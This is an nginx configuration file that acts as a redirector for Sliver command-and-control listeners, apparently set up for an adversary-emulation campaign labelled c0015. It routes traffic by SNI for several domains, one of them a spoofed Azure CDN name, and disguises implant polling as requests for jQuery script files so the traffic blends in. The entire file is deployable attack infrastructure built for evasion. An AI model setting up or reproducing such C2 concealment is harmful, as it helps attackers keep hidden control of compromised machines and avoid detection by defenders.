# nginx front for the C2 listeners
#
# Two jobs:
#   1. terminate nothing - route by TLS SNI on 443 to the two Sliver HTTPS listeners
#   2. rewrite the HTTP paths so the implant traffic matches the jQuery profile on the wire
#
# Place at /etc/nginx/conf.d/c0015.conf and reload.

stream {
    map $ssl_preread_server_name $c0015_backend {
        checkauj.com        127.0.0.1:8443;
        five.azureedge.net  127.0.0.1:8443;
        perdefue.fr         127.0.0.1:8444;
        default             127.0.0.1:8443;
    }

    server {
        listen 443;
        proxy_pass $c0015_backend;
        ssl_preread on;
    }
}

http {
    upstream c0015_http {
        server 127.0.0.1:8081;
    }

    server {
        listen 80;
        server_name five.azureedge.net checkauj.com;

        # The implant polls one path and posts to the same path. The profile exposes two URIs,
        # so both are accepted and normalised to the listener path.
        location = /jquery-3.3.1.min.js {
            proxy_pass http://c0015_http;
            proxy_set_header Host $host;
            proxy_set_header X-Forwarded-For $remote_addr;
            access_log /var/log/nginx/c0015-access.log c0015;
        }

        location = /jquery-3.3.2.min.js {
            proxy_pass http://c0015_http;
            proxy_set_header Host $host;
            proxy_set_header X-Forwarded-For $remote_addr;
            access_log /var/log/nginx/c0015-access.log c0015;
        }

        location / {
            return 404;
        }
    }

    log_format c0015 '$remote_addr - $host "$request" $status $body_bytes_sent "$http_user_agent"';
}
